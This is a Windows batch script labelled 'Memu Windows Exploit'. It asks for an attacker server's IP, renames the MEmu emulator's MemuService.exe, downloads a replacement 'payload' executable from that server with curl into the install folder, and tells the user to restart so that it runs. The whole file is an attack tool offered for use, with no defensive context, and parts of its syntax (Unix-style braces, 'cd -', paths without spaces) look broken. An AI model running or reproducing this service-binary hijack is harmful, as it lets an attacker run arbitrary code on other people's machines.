@echo off

echo "---- [\./] Memu Windows Exploit [\./] -----"
echo "---- . . p r e s s  a n y  k e y  . . -----"

pause>nul 

:BEGIN 

set /p _ip= Please enter server's ip:

set _url= "http://%_ip%/MemuService.exe"

echo %_url%


set /p _ans= Do you want to continue? [y/n or quit]

if "%_ans%" == "y" (GOTO CHECKPATH) else if "%_ans%" == "quit" (GOTO FINISH) else (GOTO BEGIN)

pause>nul


:CHECKPATH

if exist "C:\ProgramFiles(x86)\Microvirt\MEmu\" GOTO FIRSTPATH

if exist "C:\ProgramFiles\Microvirt\MEmu\" GOTO SECONDPATH

echo "PATH ERROR, check your program's installation path. Enter any key to close."

pause>nul

GOTO FINISH


:FIRSTPATH

ren C:\ProgramFiles(x86)\Microvirt\MEmu\MemuService.exe MemuService.bak

cd C:\ProgramFiles(x86)\Microvirt\MEmu\ && { curl  "%_url%" --output MemuService.exe ; cd -; }

echo "Payload placed, now restart the system."

pause>nul


GOTO FINISH


:SECONDPATH

ren C:\ProgramFiles\Microvirt\MEmu\MemuService.exe MemuService.bak

cd C:\ProgramFiles\Microvirt\MEmu\ && { curl  "%_url%" --output MemuService.exe ; cd -; }

echo "Payload placed, now restart the system."

pause>nul


:FINISH

